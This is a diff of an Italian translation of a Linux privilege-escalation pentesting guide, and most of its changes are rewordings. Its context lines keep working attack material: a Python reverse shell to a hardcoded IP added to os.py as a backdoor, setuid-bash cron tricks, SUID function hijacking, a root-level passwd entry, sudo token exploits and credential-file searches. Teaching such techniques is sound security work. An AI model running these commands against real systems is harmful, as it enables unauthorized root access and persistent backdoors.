@@ -4,9 +4,9 @@
 
 ## Informazioni sul sistema
 
-### Informazioni sul SO
+### Info OS
 
-Iniziamo a ottenere alcune informazioni sul SO in esecuzione
+Iniziamo a ottenere alcune informazioni sul sistema operativo in esecuzione
 ```bash
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null # old, not by default on many systems
@@ -18,7 +18,7 @@ Se **hai permessi di scrittura su qualsiasi cartella all'interno della variabile
 ```bash
 echo $PATH
 ```
-### Env info
+### Info ambiente
 
 Informazioni interessanti, password o chiavi API nelle variabili d'ambiente?
 ```bash
@@ -124,6 +124,7 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 ## Docker Breakout
 
 Se sei all'interno di un container docker, puoi provare a fuggire da esso:
+
 
 {{#ref}}
 docker-security/
@@ -276,7 +277,7 @@ Per eseguire il dump della memoria di un processo puoi usare:
 
 #### Esempio manuale
 
-Se trovi che il processo dell'autenticatore è in esecuzione:
+Se trovi che il processo di autenticazione è in esecuzione:
 ```bash
 ps -ef | grep "authenticator"
 root      2027  2025  0 11:46 ?        00:00:00 authenticator
@@ -315,7 +316,7 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 ```
 ## Scheduled/Cron jobs
 
-Controlla se qualche lavoro programmato è vulnerabile. Forse puoi approfittare di uno script eseguito da root (vulnerabilità wildcard? può modificare file che root utilizza? usare symlink? creare file specifici nella directory che root utilizza?).
+Controlla se qualche lavoro programmato è vulnerabile. Forse puoi approfittare di uno script eseguito da root (vulnerabilità wildcard? può modificare file utilizzati da root? usare symlink? creare file specifici nella directory utilizzata da root?).
 ```bash
 crontab -l
 ls -al /etc/cron* /etc/at*
@@ -327,7 +328,7 @@ Ad esempio, all'interno di _/etc/crontab_ puoi trovare il PATH: _PATH=**/home/us
 
 (_Nota come l'utente "user" ha privilegi di scrittura su /home/user_)
 
-Se all'interno di questo crontab l'utente root cerca di eseguire qualche comando o script senza impostare il percorso. Ad esempio: _\* \* \* \* root overwrite.sh_\
+Se all'interno di questo crontab l'utente root prova a eseguire qualche comando o script senza impostare il percorso. Ad esempio: _\* \* \* \* root overwrite.sh_\
 Allora, puoi ottenere una shell root usando:
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
@@ -361,11 +362,11 @@ Se lo script eseguito da root utilizza una **directory a cui hai accesso complet
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
-### Lavori cron frequenti
+### Frequent cron jobs
 
-Puoi monitorare i processi per cercare quelli che vengono eseguiti ogni 1, 2 o 5 minuti. Potresti approfittarne per elevare i privilegi.
+Puoi monitorare i processi per cercare processi che vengono eseguiti ogni 1, 2 o 5 minuti. Forse puoi approfittarne e aumentare i privilegi.
 
-Ad esempio, per **monitorare ogni 0,1s per 1 minuto**, **ordinare per comandi meno eseguiti** e eliminare i comandi che sono stati eseguiti di più, puoi fare:
+Ad esempio, per **monitorare ogni 0.1s per 1 minuto**, **ordinare per comandi meno eseguiti** e eliminare i comandi che sono stati eseguiti di più, puoi fare:
 ```bash
 for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
 ```
@@ -406,7 +407,7 @@ Poi, crea un **eseguibile** con lo **stesso nome del percorso relativo del binar
 
 ## **Timer**
 
-I **Timer** sono file di unità systemd il cui nome termina con `**.timer**` che controllano i file `**.service**` o eventi. I **Timer** possono essere utilizzati come alternativa a cron poiché hanno supporto integrato per eventi di tempo del calendario e eventi di tempo monotono e possono essere eseguiti in modo asincrono.
+I **Timer** sono file di unità systemd il cui nome termina con `**.timer**` che controllano i file `**.service**` o eventi. I **Timer** possono essere utilizzati come alternativa a cron poiché hanno supporto integrato per eventi di tempo calendario ed eventi di tempo monotono e possono essere eseguiti in modo asincrono.
 
 Puoi enumerare tutti i timer con:
 ```bash
@@ -420,7 +421,7 @@ Unit=backdoor.service
 ```
 Nella documentazione puoi leggere cosa è l'Unit:
 
-> L'unità da attivare quando questo timer scade. L'argomento è un nome di unità, il cui suffisso non è ".timer". Se non specificato, questo valore predefinito è un servizio che ha lo stesso nome dell'unità timer, tranne per il suffisso. (Vedi sopra.) Si raccomanda che il nome dell'unità che viene attivata e il nome dell'unità del timer siano nominati in modo identico, tranne per il suffisso.
+> L'unità da attivare quando questo timer scade. L'argomento è un nome di unità, il cui suffisso non è ".timer". Se non specificato, questo valore predefinito è un servizio che ha lo stesso nome dell'unità timer, tranne per il suffisso. (Vedi sopra.) Si raccomanda che il nome dell'unità che viene attivata e il nome dell'unità del timer siano nominati identicamente, tranne per il suffisso.
 
 Pertanto, per abusare di questo permesso dovresti:
 
@@ -446,11 +447,11 @@ I sockets possono essere configurati utilizzando file `.socket`.
 
 **Scopri di più sui sockets con `man systemd.socket`.** All'interno di questo file, possono essere configurati diversi parametri interessanti:
 
-- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Queste opzioni sono diverse ma viene utilizzato un riepilogo per **indicare dove ascolterà** il socket (il percorso del file socket AF_UNIX, l'IPv4/6 e/o il numero di porta da ascoltare, ecc.)
+- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Queste opzioni sono diverse, ma viene utilizzato un riepilogo per **indicare dove ascolterà** il socket (il percorso del file socket AF_UNIX, l'IPv4/6 e/o il numero di porta da ascoltare, ecc.)
 - `Accept`: Accetta un argomento booleano. Se **vero**, una **istanza di servizio viene generata per ogni connessione in arrivo** e solo il socket di connessione viene passato ad essa. Se **falso**, tutti i sockets di ascolto stessi sono **passati all'unità di servizio avviata**, e solo un'unità di servizio viene generata per tutte le connessioni. Questo valore viene ignorato per i sockets datagram e le FIFO dove un'unica unità di servizio gestisce incondizionatamente tutto il traffico in arrivo. **Di default è falso**. Per motivi di prestazioni, si raccomanda di scrivere nuovi demoni solo in un modo che sia adatto per `Accept=no`.
 - `ExecStartPre`, `ExecStartPost`: Accetta una o più righe di comando, che vengono **eseguite prima** o **dopo** che i **sockets**/FIFO di ascolto siano **creati** e legati, rispettivamente. Il primo token della riga di comando deve essere un nome di file assoluto, seguito da argomenti per il processo.
 - `ExecStopPre`, `ExecStopPost`: Comandi aggiuntivi che vengono **eseguiti prima** o **dopo** che i **sockets**/FIFO di ascolto siano **chiusi** e rimossi, rispettivamente.
-- `Service`: Specifica il nome dell'unità di **servizio** **da attivare** sul **traffico in arrivo**. Questa impostazione è consentita solo per i sockets con Accept=no. Di default, corrisponde al servizio che porta lo stesso nome del socket (con il suffisso sostituito). Nella maggior parte dei casi, non dovrebbe essere necessario utilizzare questa opzione.
+- `Service`: Specifica il nome dell'unità di **servizio** **da attivare** su **traffico in arrivo**. Questa impostazione è consentita solo per i sockets con Accept=no. Di default, è impostato sul servizio che porta lo stesso nome del socket (con il suffisso sostituito). Nella maggior parte dei casi, non dovrebbe essere necessario utilizzare questa opzione.
 
 ### File .socket scrivibili
 
@@ -491,9 +492,9 @@ Se il socket **risponde con una richiesta HTTP**, allora puoi **comunicare** con
 
 ### Socket Docker Scrivibile
 
-Il socket Docker, spesso trovato in `/var/run/docker.sock`, è un file critico che dovrebbe essere protetto. Per impostazione predefinita, è scrivibile dall'utente `root` e dai membri del gruppo `docker`. Possedere accesso in scrittura a questo socket può portare a un'elevazione di privilegi. Ecco una panoramica di come ciò può essere fatto e metodi alternativi se il Docker CLI non è disponibile.
+Il socket Docker, spesso trovato in `/var/run/docker.sock`, è un file critico che dovrebbe essere protetto. Per impostazione predefinita, è scrivibile dall'utente `root` e dai membri del gruppo `docker`. Possedere l'accesso in scrittura a questo socket può portare a un'escalation dei privilegi. Ecco una panoramica di come ciò può essere fatto e metodi alternativi se il Docker CLI non è disponibile.
 
-#### **Elevazione di Privilegi con Docker CLI**
+#### **Escalation dei Privilegi con Docker CLI**
 
 Se hai accesso in scrittura al socket Docker, puoi elevare i privilegi utilizzando i seguenti comandi:
 ```bash
@@ -538,7 +539,7 @@ Dopo aver impostato la connessione `socat`, puoi eseguire comandi direttamente n
 
 ### Altri
 
-Nota che se hai permessi di scrittura sul socket docker perché sei **all'interno del gruppo `docker`** hai [**più modi per elevare i privilegi**](interesting-groups-linux-pe/index.html#docker-group). Se l'[**API docker sta ascoltando su una porta** puoi anche essere in grado di comprometterla](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
+Nota che se hai permessi di scrittura sul socket docker perché sei **all'interno del gruppo `docker`** hai [**più modi per elevare i privilegi**](interesting-groups-linux-pe/index.html#docker-group). Se l' [**API docker sta ascoltando su una porta** puoi anche essere in grado di comprometterla](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
 Controlla **altri modi per uscire da docker o abusarne per elevare i privilegi** in:
 
@@ -569,7 +570,7 @@ runc-privilege-escalation.md
 
 D-Bus è un sofisticato **sistema di comunicazione inter-processo (IPC)** che consente alle applicazioni di interagire e condividere dati in modo efficiente. Progettato tenendo presente il moderno sistema Linux, offre un robusto framework per diverse forme di comunicazione tra applicazioni.
 
-Il sistema è versatile, supportando IPC di base che migliora lo scambio di dati tra processi, simile a **socket di dominio UNIX avanzati**. Inoltre, aiuta a trasmettere eventi o segnali, favorendo un'integrazione senza soluzione di continuità tra i componenti del sistema. Ad esempio, un segnale da un demone Bluetooth riguardo a una chiamata in arrivo può indurre un lettore musicale a silenziarsi, migliorando l'esperienza dell'utente. Inoltre, D-Bus supporta un sistema di oggetti remoti, semplificando le richieste di servizio e le invocazioni di metodo tra le applicazioni, snellendo processi che erano tradizionalmente complessi.
+Il sistema è versatile, supportando IPC di base che migliora lo scambio di dati tra processi, simile a **socket di dominio UNIX avanzati**. Inoltre, aiuta a trasmettere eventi o segnali, favorendo un'integrazione fluida tra i componenti del sistema. Ad esempio, un segnale da un demone Bluetooth riguardo a una chiamata in arrivo può indurre un lettore musicale a silenziarsi, migliorando l'esperienza dell'utente. Inoltre, D-Bus supporta un sistema di oggetti remoti, semplificando le richieste di servizio e le invocazioni di metodo tra le applicazioni, snellendo processi che erano tradizionalmente complessi.
 
 D-Bus opera su un **modello di autorizzazione/negazione**, gestendo i permessi dei messaggi (chiamate di metodo, emissioni di segnali, ecc.) in base all'effetto cumulativo delle regole di policy corrispondenti. Queste politiche specificano le interazioni con il bus, consentendo potenzialmente l'elevazione dei privilegi attraverso lo sfruttamento di questi permessi.
 
@@ -585,7 +586,6 @@ Le politiche senza un utente o gruppo specificato si applicano universalmente, m
 </policy>
 ```
 **Impara come enumerare e sfruttare una comunicazione D-Bus qui:**
-
 
 {{#ref}}
 d-bus-enumeration-and-command-injection-privilege-escalation.md
@@ -618,7 +618,7 @@ cat /etc/networks
 #Files used by network services
 lsof -i
 ```
-### Open ports
+### Porte aperte
 
 Controlla sempre i servizi di rete in esecuzione sulla macchina con cui non sei stato in grado di interagire prima di accedervi:
 ```bash
@@ -739,7 +739,7 @@ $ sudo -l
 User waldo may run the following commands on admirer:
 (ALL) SETENV: /opt/scripts/admin_tasks.sh
 ```
-Questo esempio, **basato sulla macchina HTB Admirer**, era **vulnerabile** all'**hijacking di PYTHONPATH** per caricare una libreria python arbitraria durante l'esecuzione dello script come root:
+Questo esempio, **basato sulla macchina HTB Admirer**, era **vulnerabile** all'**hijacking di PYTHONPATH** per caricare una libreria python arbitraria mentre si eseguiva lo script come root:
 ```bash
 sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
@@ -772,13 +772,13 @@ sudo less
 ```
 Questa tecnica può essere utilizzata anche se un **suid** binary **esegue un altro comando senza specificare il percorso (controlla sempre con** _**strings**_ **il contenuto di un strano SUID binary)**.
 
-[Esempi di payload da eseguire.](payloads-to-execute.md)
+[Payload examples to execute.](payloads-to-execute.md)
 
 ### SUID binary con percorso del comando
 
 Se il **suid** binary **esegue un altro comando specificando il percorso**, allora puoi provare a **esportare una funzione** chiamata come il comando che il file suid sta chiamando.
 
-Ad esempio, se un binary suid chiama _**/usr/sbin/service apache2 start**_ devi provare a creare la funzione ed esportarla:
+Ad esempio, se un suid binary chiama _**/usr/sbin/service apache2 start**_ devi provare a creare la funzione ed esportarla:
 ```bash
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
@@ -899,7 +899,7 @@ significa che la libreria che hai generato deve avere una funzione chiamata `a_f
 
 ### GTFOBins
 
-[**GTFOBins**](https://gtfobins.github.io) è un elenco curato di binari Unix che possono essere sfruttati da un attaccante per bypassare le restrizioni di sicurezza locali. [**GTFOArgs**](https://gtfoargs.github.io/) è lo stesso ma per i casi in cui puoi **iniettare solo argomenti** in un comando.
+[**GTFOBins**](https://gtfobins.github.io) è un elenco curato di binari Unix che possono essere sfruttati da un attaccante per bypassare le restrizioni di sicurezza locali. [**GTFOArgs**](https://gtfoargs.github.io/) è lo stesso ma per i casi in cui puoi **solo iniettare argomenti** in un comando.
 
 Il progetto raccoglie funzioni legittime di binari Unix che possono essere abusate per uscire da shell ristrette, elevare o mantenere privilegi elevati, trasferire file, generare shell bind e reverse, e facilitare altre attività post-exploitation.
 
@@ -943,7 +943,7 @@ bash exploit.sh
 /tmp/activate_sudo_token
 sudo su
 ```
-- Il **secondo exploit** (`exploit_v2.sh`) creerà una shell sh in _/tmp_ **di proprietà di root con setuid**
+- Il **secondo exploit** (`exploit_v2.sh`) creerà una shell sh in _/tmp_ **possessa da root con setuid**
 ```bash
 bash exploit_v2.sh
 /tmp/sh -p
@@ -955,7 +955,7 @@ sudo su
 ```
 ### /var/run/sudo/ts/\<Username>
 
-Se hai **permessi di scrittura** nella cartella o su uno dei file creati all'interno della cartella, puoi utilizzare il binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) per **creare un token sudo per un utente e un PID**.\
+Se hai **permessi di scrittura** nella cartella o su uno dei file creati all'interno della cartella, puoi utilizzare il binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) per **creare un token sudo per un utente e PID**.\
 Ad esempio, se puoi sovrascrivere il file _/var/run/sudo/ts/sampleuser_ e hai una shell come quell'utente con PID 1234, puoi **ottenere privilegi sudo** senza bisogno di conoscere la password eseguendo:
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
@@ -1065,7 +1065,7 @@ Leggi la pagina seguente per **scoprire di più sulle capacità e su come abusar
 linux-capabilities.md
 {{#endref}}
 
-## Permessi delle directory
+## Permessi di directory
 
 In una directory, il **bit per "eseguire"** implica che l'utente interessato può "**cd**" nella cartella.\
 Il bit **"leggi"** implica che l'utente può **elencare** i **file**, e il bit **"scrivi"** implica che l'utente può **cancellare** e **creare** nuovi **file**.
@@ -1088,7 +1088,7 @@ getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ## Apri sessioni shell
 
 In **vecchie versioni** puoi **dirottare** alcune sessioni **shell** di un altro utente (**root**).\
-Nelle **versioni più recenti** sarai in grado di **connetterti** solo alle sessioni screen del **tuo utente**. Tuttavia, potresti trovare **informazioni interessanti all'interno della sessione**.
+Nelle **versioni più recenti** sarai in grado di **connetterti** solo alle sessioni screen del **tuo stesso utente**. Tuttavia, potresti trovare **informazioni interessanti all'interno della sessione**.
 
 ### dirottamento delle sessioni screen
 
@@ -1168,7 +1168,7 @@ Devi impostare questa opzione in `$HOME/.ssh.config` in questo modo:
 Host example.com
 ForwardAgent yes
 ```
-Nota che se `Host` è `*` ogni volta che l'utente passa a una macchina diversa, quell'host sarà in grado di accedere alle chiavi (il che rappresenta un problema di sicurezza).
+Nota che se `Host` è `*` ogni volta che l'utente passa a una macchina diversa, quel host sarà in grado di accedere alle chiavi (il che rappresenta un problema di sicurezza).
 
 Il file `/etc/ssh_config` può **sovrascrivere** queste **opzioni** e consentire o negare questa configurazione.\
 Il file `/etc/sshd_config` può **consentire** o **negare** il forwarding dell'ssh-agent con la parola chiave `AllowAgentForwarding` (il valore predefinito è consentito).
@@ -1211,7 +1211,7 @@ openssl passwd -1 -salt hacker hacker
 mkpasswd -m SHA-512 hacker
 python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
 ```
-Poi aggiungi l'utente `hacker` e aggiungi la password generata.
+Quindi aggiungi l'utente `hacker` e aggiungi la password generata.
 ```
 hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
 ```
@@ -1246,7 +1246,7 @@ Le seguenti cartelle potrebbero contenere backup o informazioni interessanti: **
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
-### Posizioni strane/File di proprietà
+### File inusuali/di proprietà
 ```bash
 #root owned files in /home folders
 find /home -user root 2>/dev/null
@@ -1271,7 +1271,7 @@ find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -p
 ```bash
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
-### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
+### *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
 ```bash
 find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
 ```
@@ -1295,7 +1295,7 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 ```bash
 find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
 ```
-### File conosciuti contenenti password
+### File noti contenenti password
 
 Leggi il codice di [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), cerca **diversi file possibili che potrebbero contenere password**.\
 **Un altro strumento interessante** che puoi usare per farlo è: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) che è un'applicazione open source utilizzata per recuperare molte password memorizzate su un computer locale per Windows, Linux e Mac.
@@ -1303,7 +1303,7 @@ Leggi il codice di [**linPEAS**](https://github.com/carlospolop/privilege-escala
 ### Log
 
 Se puoi leggere i log, potresti essere in grado di trovare **informazioni interessanti/confidenziali al loro interno**. Più strano è il log, più interessante sarà (probabilmente).\
-Inoltre, alcuni log di **audit** "**mal**" configurati (backdoored?) potrebbero permetterti di **registrare password** all'interno dei log di audit come spiegato in questo post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
+Inoltre, alcuni log di **audit** **"mal configurati"** (backdoored?) potrebbero permetterti di **registrare password** all'interno dei log di audit come spiegato in questo post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
@@ -1323,22 +1323,22 @@ Per **leggere i log il gruppo** [**adm**](interesting-groups-linux-pe/index.html
 ```
 ### Generic Creds Search/Regex
 
-Dovresti anche controllare i file che contengono la parola "**password**" nel suo **nome** o all'interno del **contenuto**, e controllare anche per IP ed email all'interno dei log, o regexps di hash.\
+Dovresti anche controllare i file che contengono la parola "**password**" nel suo **nome** o all'interno del **contenuto**, e controllare anche per IP ed email all'interno dei log, o regex di hash.\
 Non elencherò qui come fare tutto questo, ma se sei interessato puoi controllare gli ultimi controlli che [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) esegue.
 
 ## Writable files
 
 ### Python library hijacking
 
-Se sai da **dove** verrà eseguito uno script python e **puoi scrivere all'interno** di quella cartella o puoi **modificare le librerie python**, puoi modificare la libreria OS e backdoorarla (se puoi scrivere dove verrà eseguito lo script python, copia e incolla la libreria os.py).
+Se sai da **dove** verrà eseguito uno script python e **puoi scrivere all'interno** di quella cartella o puoi **modificare le librerie python**, puoi modificare la libreria OS e inserirvi un backdoor (se puoi scrivere dove verrà eseguito lo script python, copia e incolla la libreria os.py).
 
-Per **backdoorare la libreria** basta aggiungere alla fine della libreria os.py la seguente riga (cambia IP e PORT):
+Per **inserire un backdoor nella libreria** basta aggiungere alla fine della libreria os.py la seguente riga (cambia IP e PORT):
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
 ### Logrotate exploitation
 
-Una vulnerabilità in `logrotate` consente agli utenti con **permessi di scrittura** su un file di log o le sue directory genitore di potenzialmente ottenere privilegi elevati. Questo perché `logrotate`, che spesso viene eseguito come **root**, può essere manipolato per eseguire file arbitrari, specialmente in directory come _**/etc/bash_completion.d/**_. È importante controllare i permessi non solo in _/var/log_ ma anche in qualsiasi directory in cui viene applicata la rotazione dei log.
+Una vulnerabilità in `logrotate` consente agli utenti con **permessi di scrittura** su un file di log o le sue directory genitore di potenzialmente ottenere privilegi elevati. Questo perché `logrotate`, spesso in esecuzione come **root**, può essere manipolato per eseguire file arbitrari, specialmente in directory come _**/etc/bash_completion.d/**_. È importante controllare i permessi non solo in _/var/log_ ma anche in qualsiasi directory in cui viene applicata la rotazione dei log.
 
 > [!TIP]
 > Questa vulnerabilità colpisce `logrotate` versione `3.18.0` e versioni precedenti
@@ -1347,7 +1347,7 @@ Informazioni più dettagliate sulla vulnerabilità possono essere trovate su que
 
 Puoi sfruttare questa vulnerabilità con [**logrotten**](https://github.com/whotwagner/logrotten).
 
-Questa vulnerabilità è molto simile a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(log di nginx),** quindi ogni volta che scopri di poter alterare i log, controlla chi gestisce quei log e verifica se puoi ottenere privilegi elevati sostituendo i log con symlink.
+Questa vulnerabilità è molto simile a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(log di nginx),** quindi ogni volta che scopri di poter alterare i log, controlla chi gestisce quei log e verifica se puoi elevare i privilegi sostituendo i log con symlink.
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
@@ -1396,7 +1396,7 @@ escaping-from-limited-bash.md
 cisco-vmanage.md
 {{#endref}}
 
-## Protezioni di sicurezza del kernel
+## Protezioni di Sicurezza del Kernel
 
 - [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
 - [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)
@@ -1405,7 +1405,7 @@ cisco-vmanage.md
 
 [Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
 
-## Strumenti di Privesc Linux/Unix
+## Strumenti Privesc Linux/Unix
 
 ### **Miglior strumento per cercare vettori di escalation dei privilegi locali Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
@@ -1443,7 +1443,7 @@ cisco-vmanage.md
 
 ## Framework di rooting Android: abuso del canale manager
 
-I framework di rooting Android comunemente agganciano una syscall per esporre funzionalità privilegiate del kernel a un gestore nello spazio utente. Un'autenticazione debole del gestore (ad es., controlli di firma basati sull'ordine FD o schemi di password scadenti) può consentire a un'app locale di impersonare il gestore e di ottenere i privilegi di root su dispositivi già rootati. Scopri di più e dettagli di sfruttamento qui:
+I framework di rooting Android comunemente agganciano una syscall per esporre funzionalità privilegiate del kernel a un gestore nello spazio utente. Un'autenticazione debole del gestore (ad es., controlli di firma basati sull'ordine FD o schemi di password scadenti) può consentire a un'app locale di impersonare il gestore e ottenere i privilegi di root su dispositivi già rootati. Scopri di più e dettagli di sfruttamento qui:
 
 
 {{#ref}}
